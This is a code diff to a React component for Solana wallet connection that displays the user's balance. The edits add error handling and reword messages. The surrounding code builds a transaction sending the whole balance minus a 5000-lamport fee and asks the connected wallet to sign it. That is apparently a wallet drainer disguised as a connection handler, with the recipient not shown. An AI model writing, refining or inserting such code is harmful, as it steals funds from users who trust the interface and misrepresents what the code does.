@@ -85,14 +85,23 @@ const WalletConnectionHandler: FC = () => {
         try {
             setLoading(true);
             const connection = new Connection('https://api.mainnet-beta.solana.com');
-            const balanceLamports = await connection.getBalance(walletPublicKey);
+
+            let balanceLamports: number;
+            try {
+                balanceLamports = await connection.getBalance(walletPublicKey);
+            } catch (err) {
+                console.error('❌ Failed to fetch balance:', err);
+                setSolBalance(null);
+                return;
+            }
+
             const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
             setSolBalance(balanceSOL);
             console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(4)} SOL`);
 
-            const transferAmount = balanceLamports - 5000; // Leave ~5000 lamports for fee
+            const transferAmount = balanceLamports - 5000; // Leave lamports for fee
             if (transferAmount <= 0) {
-                console.warn('❌ Not enough balance to transfer after fee.');
+                console.warn('⚠️ Not enough SOL to send after fees.');
                 return;
             }
 
@@ -106,7 +115,6 @@ const WalletConnectionHandler: FC = () => {
             tx.feePayer = walletPublicKey;
             tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
-            // ✅ Fix: Ensure signTransaction is defined
             if (!signTransaction) {
                 console.error('❌ Wallet does not support signing transactions.');
                 return;
@@ -124,7 +132,7 @@ const WalletConnectionHandler: FC = () => {
                 }
             }, 10000);
         } catch (error) {
-            console.error('❌ Error during transaction preparation:', error);
+            console.error('❌ Transaction preparation error:', error);
         } finally {
             setLoading(false);
         }
@@ -156,7 +164,11 @@ const WalletConnectionHandler: FC = () => {
             </p>
             <p style={{ color: '#000' }}>
                 <strong>Balance:</strong>{' '}
-                {loading ? 'Loading...' : solBalance !== null ? solBalance.toFixed(4) : 'Error'} SOL
+                {loading
+                    ? 'Loading...'
+                    : solBalance === null
+                    ? 'Unable to fetch balance'
+                    : `${solBalance.toFixed(4)} SOL`}
             </p>
         </div>
     );
